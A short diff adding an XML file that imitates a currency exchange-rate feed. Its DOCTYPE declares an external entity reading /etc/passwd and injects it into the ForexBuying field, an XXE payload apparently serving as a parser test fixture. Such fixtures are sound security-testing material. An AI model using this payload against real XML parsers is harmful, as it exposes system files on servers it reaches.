@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE Tarih_Date [<!ENTITY leak SYSTEM "file:///etc/passwd">]>
+<Tarih_Date Tarih="20.10.2026"><Currency CurrencyCode="USD"><Unit>1</Unit><ForexBuying>&leak;</ForexBuying><ForexSelling>1</ForexSelling></Currency></Tarih_Date>
